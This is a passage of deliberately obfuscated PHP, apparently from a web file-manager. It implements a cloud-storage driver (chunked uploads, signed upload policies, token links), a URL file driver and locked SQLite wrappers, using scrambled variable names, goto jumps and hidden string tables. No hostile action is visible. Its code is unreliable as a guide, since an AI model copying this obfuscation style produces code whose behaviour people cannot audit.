{ goto B«ÊôîïÔÃ; DÀı‘§üÌ¿: while (!0) { $Eä¥Î®ÿ⁄∆ = $this->fileList($a—äíâƒ√ë, $BóÔ„∆«‘”, $EÏ∆ƒÃ±üÖ); if (!$Eä¥Î®ÿ⁄∆) { return !1; } $BóÔ„∆«‘” = isset($Eä¥Î®ÿ⁄∆[$cÊó‹±‘≠”[1261]]) ? $Eä¥Î®ÿ⁄∆[$cÊó‹±‘≠”[1261]] : $cÊó‹±‘≠”[33]; $BÕ˜Öπ÷›é = isset($Eä¥Î®ÿ⁄∆[$cÊó‹±‘≠”[1262]]) ? $Eä¥Î®ÿ⁄∆[$cÊó‹±‘≠”[1262]] : array(); if (empty($BÕ˜Öπ÷›é)) { break; } $aëä∆™ÉÃì = array_to_keyvalue($BÕ˜Öπ÷›é, $cÊó‹±‘≠”[33], $cÊó‹±‘≠”[29]); $D∂êÚ•õøê = array_count_values($aëä∆™ÉÃì); $cóﬂ›ÔØé≈ = isset($D∂êÚ•õøê[$cÊó‹±‘≠”[76]]) ? $D∂êÚ•õøê[$cÊó‹±‘≠”[76]] : 0; $fÛ√¥∞»≥Ù = count($aëä∆™ÉÃì) - $cóﬂ›ÔØé≈; if ($aÆÁœπÇ©í) { $aõÒ·√ıá≥ += $cóﬂ›ÔØé≈; $cÍ¢°Çœ÷´ += $fÛ√¥∞»≥Ù; if ($BΩÇ∞¶å◊Û < $EÏ∆ƒÃ±üÖ) { break; } continue; } if ($b¡ﬁÂ∂áìå) { if ($fÛ√¥∞»≥Ù) { return !0; } } else { if ($cóﬂ›ÔØé≈) { return !0; } } if (count($BÕ˜Öπ÷›é) < $EÏ∆ƒÃ±üÖ) { break; } } if ($aÆÁœπÇ©í) { return array($cÊó‹±‘≠”[191] => $cÍ¢°Çœ÷´, $cÊó‹±‘≠”[192] => $aõÒ·√ıá≥); } return !1; goto B≈∆¨£ô–¯; fì‚µø¿÷ö: $cÍ¢°Çœ÷´ = 0; $aõÒ·√ıá≥ = 0; $báÖ“œ≠’’ = rtrim($a—äíâƒ√ë, $cÊó‹±‘≠”[8]) . $cÊó‹±‘≠”[8]; goto DÀı‘§üÌ¿; B«ÊôîïÔÃ: $cÊó‹±‘≠” =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BóÔ„∆«‘” = $cÊó‹±‘≠”[33]; $EÏ∆ƒÃ±üÖ = 1000; goto fì‚µø¿÷ö; B≈∆¨£ô–¯: } public function listAll($Aóó¥Üø’ü) { $EıΩ∫êŸƒ€ = array(); $this->recursionAllFiles($Aóó¥Üø’ü, $EıΩ∫êŸƒ€); return $EıΩ∫êŸƒ€; } public function canRead($b€≤≥æü’£) { return $this->exist($b€≤≥æü’£) ? !0 : !1; } public function canWrite($aﬁìÑÃÕ…ÿ) { return $this->exist($aﬁìÑÃÕ…ÿ) ? !0 : !1; } public function getContent($bıòæ˘ÆØã) { return $this->fileSubstr($bıòæ˘ÆØã, 0, -1); } public function setContent($A∂∫·ºù∫Í, $CÏàáÀ∞ãï = '') { $aàò«≈∆ú¿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$CÏàáÀ∞ãï) { $aﬁÙŸ¡«ÃÌ = $this->ussRequest($A∂∫·ºù∫Í, $aàò«≈∆ú¿[212]); return $aﬁÙŸ¡«ÃÌ[$aàò«≈∆ú¿[1036]]; } $aÁÇ‡âÙäâ = $this->tempFile($this->pathThis($A∂∫·ºù∫Í)); file_put_contents($aÁÇ‡âÙäâ, $CÏàáÀ∞ãï); if ($this->upload($A∂∫·ºù∫Í, $aÁÇ‡âÙäâ)) { $this->tempFileRemve($aÁÇ‡âÙäâ); return !0; } return !1; } public function fileSubstr($E–»õ≠∏€Í, $BÑåÉñΩ‹±, $eµÔ™ºñëë) { $Câ†ƒ¯®¯è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!($Bπ∞£ıÁÊü = $this->link($E–»õ≠∏€Í))) { return !1; } $EÉÉﬁåÑÈÉ = !1; if ($eµÔ™ºñëë > 0) { $FÉäìÖî¡ = $BÑåÉñΩ‹± + $eµÔ™ºñëë - 1; $EÉÉﬁåÑÈÉ = array($Câ†ƒ¯®¯è[1223] . $BÑåÉñΩ‹± . $Câ†ƒ¯®¯è[412] . $FÉäìÖî¡); } $eàëô≤Î∑¢ = url_request($Bπ∞£ıÁÊü, $Câ†ƒ¯®¯è[216], !1, $EÉÉﬁåÑÈÉ); return $eàëô≤Î∑¢[$Câ†ƒ¯®¯è[689]] ? $eàëô≤Î∑¢[$Câ†ƒ¯®¯è[1038]] : !1; } public function upload($BÒœ”÷òÁå, $CÎ∂≤É¶Àó, $A°©§Â∆ÉÓ = false, $aà´åŸ°µç = REPEAT_REPLACE) { goto Dõ•ü∂ºÀÒ; Dõ•ü∂ºÀÒ: $E≥ó–á«ëÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eç„¯∞´ı = IO::size($CÎ∂≤É¶Àó); if ($Eç„¯∞´ı <= 1024 * 1024 * 200) { $E∫≥‡õ›∞Ô = array($E≥ó–á«ëÜ[1263] . $CÎ∂≤É¶Àó); $C˘À¢ú™Ç‚ = $this->ussRequest($BÒœ”÷òÁå, $E≥ó–á«ëÜ[214], $E∫≥‡õ›∞Ô); return $C˘À¢ú™Ç‚[$E≥ó–á«ëÜ[1036]] ? $this->getPathOuter($BÒœ”÷òÁå) : !1; } goto aÓÛÿ‘Õß≤; a™∞çåá⁄Ø: $C§ù¢®Æ—∆ = $f¢´áï”‹æ[$E≥ó–á«ëÜ[1268]]; $fˆ„Éê›Ôö = fopen($CÎ∂≤É¶Àó, $E≥ó–á«ëÜ[1173]); if (!$fˆ„Éê›Ôö) { return !1; } goto Fëáù‘¡Ñ†; aÓÛÿ‘Õß≤: $d≠◊ãñõ°° = 1024 * 1024 * 10; $AÃÌçæ‰éÚ = array($E≥ó–á«ëÜ[1264], $E≥ó–á«ëÜ[1265] . $Eç„¯∞´ı, $E≥ó–á«ëÜ[1266], $E≥ó–á«ëÜ[1267] . $d≠◊ãñõ°°); $C˘À¢ú™Ç‚ = $this->ussRequest($BÒœ”÷òÁå, $E≥ó–á«ëÜ[214], !1, $AÃÌçæ‰éÚ); goto A¯¡¯Ø≤œ·; Fëáù‘¡Ñ†: do { $E˜ø”°€£æ = $f¢´áï”‹æ[$E≥ó–á«ëÜ[1269]]; fseek($fˆ„Éê›Ôö, $F·ç§ó≠ˆü); $b®ÇÎÓ“°ç = fread($fˆ„Éê›Ôö, $E˜ø”°€£æ); $A°¨Ëﬁ≤±ç = 0; do { $A°¨Ëﬁ≤±ç++; $f¢´áï”‹æ = $this->uploadPart($BÒœ”÷òÁå, $f¢´áï”‹æ, $b®ÇÎÓ“°ç); } while (!$f¢´áï”‹æ && $A°¨Ëﬁ≤±ç < 3); if (!$f¢´áï”‹æ) { return !1; } $C§ù¢®Æ—∆ = $f¢´áï”‹æ[$E≥ó–á«ëÜ[1268]]; $F·ç§ó≠ˆü += $E˜ø”°€£æ; } while ($C§ù¢®Æ—∆ != -1); fclose($fˆ„Éê›Ôö); $AÃÌçæ‰éÚ = array($E≥ó–á«ëÜ[1270], $E≥ó–á«ëÜ[1271] . $f¢´áï”‹æ[$E≥ó–á«ëÜ[1272]], $E≥ó–á«ëÜ[1266]); goto aØêπ©†è; aØêπ©†è: $C˘À¢ú™Ç‚ = $this->ussRequest($BÒœ”÷òÁå, $E≥ó–á«ëÜ[214], !1, $AÃÌçæ‰éÚ); return $C˘À¢ú™Ç‚[$E≥ó–á«ëÜ[1036]] ? $this->getPathOuter($bäãΩá¯ﬁ≈) : !1; goto CèÔªåã∫â; A¯¡¯Ø≤œ·: if (!$C˘À¢ú™Ç‚[$E≥ó–á«ëÜ[1036]]) { return !1; } $f¢´áï”‹æ = $C˘À¢ú™Ç‚[$E≥ó–á«ëÜ[1038]]; $F·ç§ó≠ˆü = 0; goto a™∞çåá⁄Ø; CèÔªåã∫â: } private function uploadPart($Büõ»†πá±, $c¿ø¡éôé¡, &$f»¬çèÿáÖ) { $a¨Î–äÌ¡ı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eî≠Ò◊∆†  = array($a¨Î–äÌ¡ı[1273], $a¨Î–äÌ¡ı[1271] . $c¿ø¡éôé¡[$a¨Î–äÌ¡ı[1272]], $a¨Î–äÌ¡ı[1274] . $c¿ø¡éôé¡[$a¨Î–äÌ¡ı[1268]], $a¨Î–äÌ¡ı[138] . $c¿ø¡éôé¡[$a¨Î–äÌ¡ı[1269]]); $fÆ´ÇØÀéö = $this->ussRequest($Büõ»†πá±, $a¨Î–äÌ¡ı[214], $f»¬çèÿáÖ, $Eî≠Ò◊∆† ); return !$fÆ´ÇØÀéö[$a¨Î–äÌ¡ı[1036]] ? $fÆ´ÇØÀéö[$a¨Î–äÌ¡ı[1036]] : $fÆ´ÇØÀéö[$a¨Î–äÌ¡ı[1038]]; } public function uploadFormData($B∏æò∑ˆÂˆ, $AΩ’ÖÓÜıè = 3600) { return $this->uploadPolicy($B∏æò∑ˆÂˆ, $AΩ’ÖÓÜıè); } public function multiUploadFormData($EõëßÑëÚü, $cÇ±º§§Ç = 3600) { $AÊŒûª∏…” =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $céã°‡∑£… = (int) $GLOBALS[$AÊŒûª∏…”[7]][$AÊŒûª∏…”[77]]; return $this->uploadPolicy($EõëßÑëÚü, $cÇ±º§§Ç, $céã°‡∑£…); } private function uploadPolicy($f•¨…πõ‹õ, $F≠ØÚ“ôÒÜ = 3600, $Aâ¯°¥≤ªº = 0) { goto a„†óÙò‚Ì; Bã“ÊúÛ…ﬁ: $FÉØêÙˆ˘∞ = base64_encode(hash_hmac($B„í…ﬂèñÁ[1245], "\x50\117\x53\124\46{$FÈÍ≠•úâê}\46{$F⁄ﬂÈ®œæµ}\x26{$bà•Ê©Ëñ‚}", md5("{$this->userpass}"), !0)); $a¡·ÏÊ”«◊ = array($B„í…ﬂèñÁ[1116] => $bà•Ê©Ëñ‚, $B„í…ﬂèñÁ[1279] => "\125\120\x59\125\116\40{$this->username}\72{$FÉØêÙˆ˘∞}", $B„í…ﬂèñÁ[169] => $this->endpoint . $FÈÍ≠•úâê); return $a¡·ÏÊ”«◊; goto fîÜÛ˘µ»î; a„†óÙò‚Ì: $B„í…ﬂèñÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÈÍ≠•úâê = $B„í…ﬂèñÁ[8] . $this->bucket; $F⁄ﬂÈ®œæµ = gmdate($B„í…ﬂèñÁ[1208]); goto B±àœøº®ƒ; B±àœøº®ƒ: $FÑâé§Ôæ√ = array($B„í…ﬂèñÁ[1275] => $this->bucket, $B„í…ﬂèñÁ[1276] => $f•¨…πõ‹õ, $B„í…ﬂèñÁ[1277] => time() + $F≠ØÚ“ôÒÜ, $B„í…ﬂèñÁ[1278] => $F⁄ﬂÈ®œæµ); if ($Aâ¯°¥≤ªº) { $FÑâé§Ôæ√[$B„í…ﬂèñÁ[1194]] = $Aâ¯°¥≤ªº; } $bà•Ê©Ëñ‚ = base64_encode(json_encode($FÑâé§Ôæ√)); goto Bã“ÊúÛ…ﬁ; fîÜÛ˘µ»î: } public function download($Dôè€„Ï∑‹, $bŒàåÎ•íΩ) { goto dÆ◊Ê∞ã»Ω; FëçÃ∞Ô…†: fclose($f¬ìπ´Úµã); return $bŒàåÎ•íΩ; goto d÷€…∆ﬂÃ≠; dÆ◊Ê∞ã»Ω: $BÍù¥≠£¿ü = IO::getPathInner(IO::mkfile($bŒàåÎ•íΩ)); if (!($C≈Æ‚Ùà†Ï = $this->link($Dôè€„Ï∑‹))) { return !1; } $E«àßÕ◊î‘ = 0; goto BΩÉœ‚¡Ö¶; BΩÉœ‚¡Ö¶: $C¶∫øÔÙﬁª = 1024 * 200; $f¬ìπ´Úµã = fopen($BÍù¥≠£¿ü, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1229]); while (!0) { $AâÒÿﬂÔ¿´ = $this->fileSubstr($Dôè€„Ï∑‹, $E«àßÕ◊î‘, $C¶∫øÔÙﬁª); if ($AâÒÿﬂÔ¿´ === !1) { return !1; } fwrite($f¬ìπ´Úµã, $AâÒÿﬂÔ¿´); $E«àßÕ◊î‘ += $C¶∫øÔÙﬁª; if (strlen($AâÒÿﬂÔ¿´) < $C¶∫øÔÙﬁª) { break; } } goto FëçÃ∞Ô…†; d÷€…∆ﬂÃ≠: } public function link($BÆü·ÚÖÀﬂ, $a’¥íÀëÇ = array()) { $bø‹–Ëé∞å =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÆü·ÚÖÀﬂ = trim($BÆü·ÚÖÀﬂ, $bø‹–Ëé∞å[8]); if (!empty($this->token)) { $dÀÈö´‹õÃ = strtotime(date($bø‹–Ëé∞å[1280])); $fï◊™£É†ﬂ = substr(md5($this->token . $bø‹–Ëé∞å[272] . $dÀÈö´‹õÃ . $bø‹–Ëé∞å[1281] . $BÆü·ÚÖÀﬂ), 12, 8) . $dÀÈö´‹õÃ; $a’¥íÀëÇ[] = $bø‹–Ëé∞å[1282] . $fï◊™£É†ﬂ; } $D‚ëîÀØ¡é = !empty($a’¥íÀëÇ) ? $bø‹–Ëé∞å[69] . implode($bø‹–Ëé∞å[272], $a’¥íÀëÇ) : $bø‹–Ëé∞å[33]; return $this->getHost() . $bø‹–Ëé∞å[8] . $BÆü·ÚÖÀﬂ . $D‚ëîÀØ¡é; } public function fileOut($Dˆ£áÑ¢©é, $bµ—ûéùÉØ = false, $e¶◊π˘…¶ã = false, $Añöî»¨œÖ = '') { if (!$e¶◊π˘…¶ã) { $e¶◊π˘…¶ã = $this->pathThis($Dˆ£áÑ¢©é); } $DÎÑêƒ›Öı = $bµ—ûéùÉØ ? array($_SERVER[Ä¿¡‡öóµŸﬂ‡][1283] . rawurlencode($e¶◊π˘…¶ã)) : array(); $E›Ñæ¢˘—Ü = $this->link($Dˆ£áÑ¢©é, $DÎÑêƒ›Öı); $this->fileOutLink($E›Ñæ¢˘—Ü); } public function fileOutServer($D¿Â¯è¬üÇ, $dŸ“õÈ∑é¨ = false, $f‚®±’áÁà = false, $c´°‘”§ë‰ = '') { parent::fileOut($D¿Â¯è¬üÇ, $dŸ“õÈ∑é¨, $f‚®±’áÁà, $c´°‘”§ë‰); } public function fileOutImage($Bå ìïèîæ, $aøÀêÇ÷⁄¶ = 250) { $D®¢ƒ·æıÖ = $this->link($Bå ìïèîæ . $_SERVER[Ä¿¡‡öóµŸﬂ‡][1284] . $aøÀêÇ÷⁄¶); $this->fileOutLink($D®¢ƒ·æıÖ); } public function fileOutImageServer($E…ËÒµ∫à∑, $b—∏àπ°Ë» = 250) { parent::fileOutImage($E…ËÒµ∫à∑, $b—∏àπ°Ë»); } public function hashMd5($fıâ—ƒ©Ï∫) { $CÕÔõŸ‚ûÈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CœåÃñÒŒ· = $this->objectMeta($fıâ—ƒ©Ï∫); return isset($CœåÃñÒŒ·[$CÕÔõŸ‚ûÈ[196]]) ? $CœåÃñÒŒ·[$CÕÔõŸ‚ûÈ[196]] : !1; } public function size($AÑÏø‰í‡) { $f†©∂Õæı∫ = $this->objectMeta($AÑÏø‰í‡); return $f†©∂Õæı∫ ? $f†©∂Õæı∫[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]] : 0; } public function info($EË¨É≈„´—) { if ($this->isFolder($EË¨É≈„´—)) { return $this->folderInfo($EË¨É≈„´—); } else { if ($this->isFile($EË¨É≈„´—)) { return $this->fileInfo($EË¨É≈„´—); } } return !1; } public function exist($E¶ˆÛì‡à§) { return $this->isFile($E¶ˆÛì‡à§) || $this->isFolder($E¶ˆÛì‡à§); } public function isFile($B‡äáí∂≤œ) { return !$this->isFolder($B‡äáí∂≤œ) && $this->objectMeta($B‡äáí∂≤œ); } public function isFolder($CÉ¥¡¨Üâ°) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][223], $CÉ¥¡¨Üâ°); } protected function objectMeta($eöì™ÆÉë≠) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][224], $eöì™ÆÉë≠); } protected function _objectMeta($aóÔ¯÷ÆàÊ) { goto eÏ§”êÁˆΩ; A≈û’ﬁ´≠ß: $AËãÜ«Ü≈Ÿ = array($b‘ûÃçÆ”Õ[28] => get_path_this($aóÔ¯÷ÆàÊ), $b‘ûÃçÆ”Õ[29] => isset($CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1286]]) ? $CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1286]] : null, $b‘ûÃçÆ”Õ[77] => isset($CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1287]]) ? $CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1287]] : null, $b‘ûÃçÆ”Õ[196] => isset($CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1288]]) ? $CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1288]] : null, $b‘ûÃçÆ”Õ[1256] => isset($CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1289]]) ? $CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1289]] : null); $AËãÜ«Ü≈Ÿ[$b‘ûÃçÆ”Õ[1257]] = isset($CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1290]]) ? strtotime($CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1290]]) : $AËãÜ«Ü≈Ÿ[$b‘ûÃçÆ”Õ[1256]]; return $AËãÜ«Ü≈Ÿ; goto Dµ∞¶Ø¿âı; Eö‹‰€≈∞è: if (!$DÃ°éú¨ ç[$b‘ûÃçÆ”Õ[1036]]) { return null; } $CÂÜå˜‘•è = isset($DÃ°éú¨ ç[$b‘ûÃçÆ”Õ[1038]]) ? $DÃ°éú¨ ç[$b‘ûÃçÆ”Õ[1038]] : array(); if (!isset($CÂÜå˜‘•è[$b‘ûÃçÆ”Õ[1286]])) { return null; } goto A≈û’ﬁ´≠ß; eÏ§”êÁˆΩ: $b‘ûÃçÆ”Õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($aóÔ¯÷ÆàÊ == $b‘ûÃçÆ”Õ[33] || $aóÔ¯÷ÆàÊ == $b‘ûÃçÆ”Õ[8]) { return array(); } $DÃ°éú¨ ç = $this->ussRequest($aóÔ¯÷ÆàÊ, $b‘ûÃçÆ”Õ[1285]); goto Eö‹‰€≈∞è; Dµ∞¶Ø¿âı: } protected function _isFolder($Bœ≈Ÿ“à∑å) { $A»⁄•Éæ≤µ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Bœ≈Ÿ“à∑å == $A»⁄•Éæ≤µ[33] || $Bœ≈Ÿ“à∑å == $A»⁄•Éæ≤µ[8]) { return !0; } $cŸßŸââê˘ = $this->objectMeta($Bœ≈Ÿ“à∑å); return isset($cŸßŸââê˘[$A»⁄•Éæ≤µ[29]]) && $cŸßŸââê˘[$A»⁄•Éæ≤µ[29]] == $A»⁄•Éæ≤µ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($D≥¥õÎÂ´Ú = false) { } public function exist($D€£˜ à√æ) { $cÁ∂åﬂüÉò = $this->info($D€£˜ à√æ); return $cÁ∂åﬂüÉò[$_SERVER[Ä¿¡‡öóµŸﬂ‡][188]]; } public function isFile($bé◊„Ñªê∞) { $d¡äÓç⁄¥‘ = $this->info($bé◊„Ñªê∞); return $d¡äÓç⁄¥‘[$_SERVER[Ä¿¡‡öóµŸﬂ‡][188]]; } public function isFolder($B¡∑ëåÇ‰›) { return !1; } public function size($A«ﬁ∞•™ΩŸ) { $e›∞àáÌõñ = $this->info($A«ﬁ∞•™ΩŸ); return $e›∞àáÌõñ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]]; } public function info($eßîËƒ´Ñ≤) { return $this->infoParse($eßîËƒ´Ñ≤); } public function infoAuth($Aò€¡€„Ç¢) { return $this->infoParse($Aò€¡€„Ç¢); } public function infoWithChildren($c™Ç–™Ù∆å) { return $this->infoParse($c™Ç–™Ù∆å); } public function infoFull($fåß≈Îœï») { return $this->infoParse($fåß≈Îœï»); } private function infoParse($A®ÜÃÖ¢Õ÷) { $f’¬û´Á±∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÙßøÔΩ‡¯ = $this->header($A®ÜÃÖ¢Õ÷); if (!$cÙßøÔΩ‡¯ || !$cÙßøÔΩ‡¯[$f’¬û´Á±∫[689]]) { return !1; } $EˆÆé¯Ïòº = _get($cÙßøÔΩ‡¯, $f’¬û´Á±∫[325], 0); $Bä∑‚ö∑û€ = array($f’¬û´Á±∫[28] => $cÙßøÔΩ‡¯[$f’¬û´Á±∫[28]], $f’¬û´Á±∫[75] => $A®ÜÃÖ¢Õ÷, $f’¬û´Á±∫[29] => $f’¬û´Á±∫[167], $f’¬û´Á±∫[77] => intval($EˆÆé¯Ïòº), $f’¬û´Á±∫[160] => get_path_ext($cÙßøÔΩ‡¯[$f’¬û´Á±∫[28]]), $f’¬û´Á±∫[1165] => $EˆÆé¯Ïòº > 0 && $cÙßøÔΩ‡¯[$f’¬û´Á±∫[1291]], $f’¬û´Á±∫[1166] => !1); return $Bä∑‚ö∑û€; } private function header($bäé∏ΩﬂÉ›) { if (isset(self::$_cacheHeader[$bäé∏ΩﬂÉ›])) { return self::$_cacheHeader[$bäé∏ΩﬂÉ›]; } self::$_cacheHeader[$bäé∏ΩﬂÉ›] = url_header($bäé∏ΩﬂÉ›); return self::$_cacheHeader[$bäé∏ΩﬂÉ›]; } public function hashSimple($Eü±Ö£è‹Â, $b”‰˘èºø = false) { goto bµÚÉÓ¡Éè; Eç‰Ë÷ÕÀﬁ: $fäû—óèØ¶ .= $this->fileSubstr($Eü±Ö£è‹Â, $AúÒÑå≥Ù™ - $D±ÎÒ÷ÂëÍ, $D±ÎÒ÷ÂëÍ); return md5($fäû—óèØ¶) . $AúÒÑå≥Ù™; goto FØä›≈“Ïª; C„≥òø⁄•ã: $AúÒÑå≥Ù™ = $bàÉ‚â®ºô[$a§åíÆÚŸª[77]]; $D±ÎÒ÷ÂëÍ = 200; $CÒà°ªä°· = 50; goto Aä‚µÀ‹ïÛ; F›á„›ìÁ≤: $C¥Ÿ»å´ƒé = timeFloat(); $CãÒÉÍßüÏ = 15; for ($b¬ó¿∏–”É = 0; $b¬ó¿∏–”É < $CÒà°ªä°·; $b¬ó¿∏–”É++) { if (timeFloat() - $C¥Ÿ»å´ƒé > $CãÒÉÍßüÏ) { return !1; } $f‘¿‚›ìÀ≠ = $this->fileSubstr($Eü±Ö£è‹Â, $EŸ„®Õê∫Ü * $b¬ó¿∏–”É, $D±ÎÒ÷ÂëÍ); if (!$f‘¿‚›ìÀ≠) { return !1; } $fäû—óèØ¶ .= $f‘¿‚›ìÀ≠; } goto Eç‰Ë÷ÕÀﬁ; Aä‚µÀ‹ïÛ: if ($AúÒÑå≥Ù™ <= $D±ÎÒ÷ÂëÍ * $CÒà°ªä°·) { return md5($this->fileSubstr($Eü±Ö£è‹Â, 0, $AúÒÑå≥Ù™)) . $AúÒÑå≥Ù™; } $EŸ„®Õê∫Ü = intval($AúÒÑå≥Ù™ / $CÒà°ªä°·); $fäû—óèØ¶ = $a§åíÆÚŸª[33]; goto F›á„›ìÁ≤; bµÚÉÓ¡Éè: $a§åíÆÚŸª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bàÉ‚â®ºô = $this->info($Eü±Ö£è‹Â); if (!$bàÉ‚â®ºô || !$bàÉ‚â®ºô[$a§åíÆÚŸª[188]]) { return !1; } goto C„≥òø⁄•ã; FØä›≈“Ïª: } public function getContent($a›Ω¡æèπö) { return $this->fileSubstr($a›Ω¡æèπö); } public function fileSubstr($a‡üÍî´≈Ò, $C¯ûÆ«∑Üö = 0, $dÁÜ≈≈È›û = -1) { goto c™øˆâÑ‹£; c™øˆâÑ‹£: $AÇ‘◊Õß§â =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F®Ñ¢≈™Øì = $this->info($a‡üÍî´≈Ò); if (!$F®Ñ¢≈™Øì || !$F®Ñ¢≈™Øì[$AÇ‘◊Õß§â[188]] && $F®Ñ¢≈™Øì[$AÇ‘◊Õß§â[77]] > 1024 * 1024 * 10) { return !1; } goto CÜ™´¶°†“; DçÛ™—å⁄—: $CÈï´Â◊í∑ = url_request($a‡üÍî´≈Ò, $AÇ‘◊Õß§â[216], !1, $b∆∞ÂÖ∫‡Æ, !1, !1, 1); return $CÈï´Â◊í∑[$AÇ‘◊Õß§â[1038]] ? $CÈï´Â◊í∑[$AÇ‘◊Õß§â[1038]] : $AÇ‘◊Õß§â[33]; goto B÷ﬁó…Âê≠; CÜ™´¶°†“: if ($dÁÜ≈≈È›û === -1) { $dÁÜ≈≈È›û = $F®Ñ¢≈™Øì[$AÇ‘◊Õß§â[77]]; } if ($dÁÜ≈≈È›û == 0) { return $AÇ‘◊Õß§â[33]; } $b∆∞ÂÖ∫‡Æ = array($AÇ‘◊Õß§â[1292] . $C¯ûÆ«∑Üö . $AÇ‘◊Õß§â[724] . ($C¯ûÆ«∑Üö + $dÁÜ≈≈È›û - 1)); goto DçÛ™—å⁄—; B÷ﬁó…Âê≠: } public function download($A«ˆ¿§âÙ†, $Dˆú¬úÔàç) { Downloader::start($A«ˆ¿§âÙ†, $Dˆú¬úÔàç); return $Dˆú¬úÔàç; } } goto D¥Ç¨Àô◊∞; cî’º—í©Ó: define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1937], 5); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1938], 16); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1939], 32); goto A´≤åæÎÀ; CçîÇ∂ºïù: class DbSqlite extends DbSqliteBase { public function query($D»èÕÎ∆®Ç) { goto AöÍî◊†Œπ; A‘ÚØç◊Óô: if (!$c¶Ú«‘–î◊) { return !1; } if (flock($c¶Ú«‘–î◊, LOCK_EX)) { $fñˆùÿÔƒ¢ = parent::query($D»èÕÎ∆®Ç); flock($c¶Ú«‘–î◊, LOCK_UN); fclose($c¶Ú«‘–î◊); return $fñˆùÿÔƒ¢; } flock($c¶Ú«‘–î◊, LOCK_UN); goto EÌÉƒê÷´ÿ; AöÍî◊†Œπ: $b≤¬äõéÌ¬ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f‚ç›É±Èé = DATA_PATH . $b≤¬äõéÌ¬[876]; $c¶Ú«‘–î◊ = fopen($f‚ç›É±Èé, $b≤¬äõéÌ¬[877]); goto A‘ÚØç◊Óô; EÌÉƒê÷´ÿ: fclose($c¶Ú«‘–î◊); show_json($b≤¬äõéÌ¬[878], !1); return !1; goto c∆»Üôö’ê; c∆»Üôö’ê: } public function execute($BœßêåëﬁÒ) { goto F≥Ñ «˘≈∫; dÀ‰˘´Üü’: if (!$BÑª∑©äÛÆ) { return !1; } if (flock($BÑª∑©äÛÆ, LOCK_EX)) { $a·ÉÙßÉÜó = parent::execute($BœßêåëﬁÒ); flock($BÑª∑©äÛÆ, LOCK_UN); fclose($BÑª∑©äÛÆ); return $a·ÉÙßÉÜó; } flock($BÑª∑©äÛÆ, LOCK_UN); goto AÓßãèµã; AÓßãèµã: fclose($BÑª∑©äÛÆ); show_json($bÔÖÍ◊ÂÖ[878], !1); return !1; goto Dœ‰›æ∫¿‰; F≥Ñ «˘≈∫: $bÔÖÍ◊ÂÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BëÃêä‡Ñô = DATA_PATH . $bÔÖÍ◊ÂÖ[876]; $BÑª∑©äÛÆ = fopen($BëÃêä‡Ñô, $bÔÖÍ◊ÂÖ[877]); goto dÀ‰˘´Üü’; Dœ‰›æ∫¿‰: } } class DbSqlite3 extends DbSqlite3Base { public function query($cÀáÕ»ú¡◊) { goto FåÀ∏ˆ∆„—; d≥⁄€õ‡éÉ: if (!$cßåßÛâÖ≠) { return !1; } if (flock($cßåßÛâÖ≠, LOCK_EX)) { $eƒÙ¬⁄±ì° = parent::query($cÀáÕ»ú¡◊); flock($cßåßÛâÖ≠, LOCK_UN); fclose($cßåßÛâÖ≠); return $eƒÙ¬⁄±ì°; } flock($cßåßÛâÖ≠, LOCK_UN); goto bÏàŸ¡’€à; FåÀ∏ˆ∆„—: $E—Íà≥‚ƒæ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FâΩÚÃÀËè = DATA_PATH . $E—Íà≥‚ƒæ[876]; $cßåßÛâÖ≠ = fopen($FâΩÚÃÀËè, $E—Íà≥‚ƒæ[877]); goto d≥⁄€õ‡éÉ; bÏàŸ¡’€à: fclose($cßåßÛâÖ≠); show_json($E—Íà≥‚ƒæ[878], !1); return !1; goto f·”ÛÚÇÛ; f·”ÛÚÇÛ: } public function execute($b·ö»µ®œù) { goto b˘„®Íê∞Ñ; a¯√œ¶¯ñÑ: fclose($b¯Ñà≤›Ü„); show_json($a⁄ãÉË¥ÎÛ[878], !1); return !1; goto fá‡÷õ’úÍ; CŸ∆Éº˘–Õ: if (!$b¯Ñà≤›Ü„) { return !1; } if (flock($b¯Ñà≤›Ü„, LOCK_EX)) { $bÈ⁄›≥âÉ∑ = parent::execute($b·ö»µ®œù); flock($b¯Ñà≤›Ü„, LOCK_UN); fclose($b¯Ñà≤›Ü„); return $bÈ⁄›≥âÉ∑; } flock($b¯Ñà≤›Ü„, LOCK_UN); goto a¯√œ¶¯ñÑ; b˘„®Íê∞Ñ: $a⁄ãÉË¥ÎÛ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F•«úÀ´Œ˘ = DATA_PATH . 